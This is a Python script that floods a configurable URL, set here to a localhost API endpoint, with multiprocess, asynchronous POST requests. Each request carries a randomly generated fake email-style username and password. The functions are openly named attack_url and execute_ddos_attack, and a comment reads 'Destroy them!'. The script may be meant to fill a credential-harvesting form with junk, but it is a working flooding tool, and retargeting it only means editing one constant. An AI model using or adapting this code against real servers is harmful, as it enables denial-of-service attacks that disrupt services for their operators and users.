from aiohttp import ClientSession
from multiprocessing import Process, cpu_count
import uvloop
import asyncio
import random
import string
import json
import sys


# Use the uvloop event loop instead of the one in asyncio
uvloop.install()


# Constants
URL = 'http://localhost/api/core/data'
FIRST_NAMES = tuple(first_name.lower() for first_name in json.load(open('first_names.json')))
LAST_NAMES = tuple(last_name.lower() for last_name in json.load(open('last_names.json')))
EMAIL_PROVIDERS = ('gmail.com', 'yahoo.com', 'aol.com', 'outlook.com', 'icloud.com')
CHARS = string.ascii_letters + string.digits + '!@#$%&'


# Send many post requests to the URL
async def send_fake_data(session):
    for _ in range(100):
        # Randomly generate a fake username and password
        first_name = random.choice(FIRST_NAMES)
        last_name = random.choice(LAST_NAMES)
        extra_digits = ''.join(random.choices(string.digits, k=random.randint(1, 5)))
        email = random.choice(EMAIL_PROVIDERS)

        username = first_name + last_name + extra_digits + '@' + email
        password = ''.join(random.choices(CHARS, k=random.randint(8, 20)))

        # Post the fake data to the URL if it has been provided
        if URL:
            try:  # If an error occurs, terminate the function
                data = {
                    # NOTE: The field names may vary depending on the URL form
                    'username': username,
                    'password': password
                }
                await session.post(URL, data=data)
            except:
                print(f'Failed to send {username} and password {password} to the URL!')
                return


# Creates many tasks for the event loop
async def attack_url_async():
    async with ClientSession() as session:
        tasks = [asyncio.create_task(send_fake_data(session)) for _ in range(100)]
        await asyncio.gather(*tasks)


# Send many post requests to the URL using asyncio
def attack_url():
    # Set up uvloop based on the version of the Python interpreter
    if sys.version_info >= (3, 11):
        with asyncio.Runner(loop_factory=uvloop.new_event_loop) as runner:
            runner.run(attack_url_async())
    else:
        asyncio.run(attack_url_async())


# Uses multiple CPU cores to flood the URL
def execute_ddos_attack():
    # Use multiprocessing to run multiple requests in parallel
    processes = [Process(target=attack_url, daemon=True) for _ in range(cpu_count())]

    # Destroy them!
    for process in processes:
        process.start()

    # Make the program wait until all the processes are done
    for process in processes:
        process.join()


# Execute the program if the script is run directly
if __name__ == '__main__':
    execute_ddos_attack()
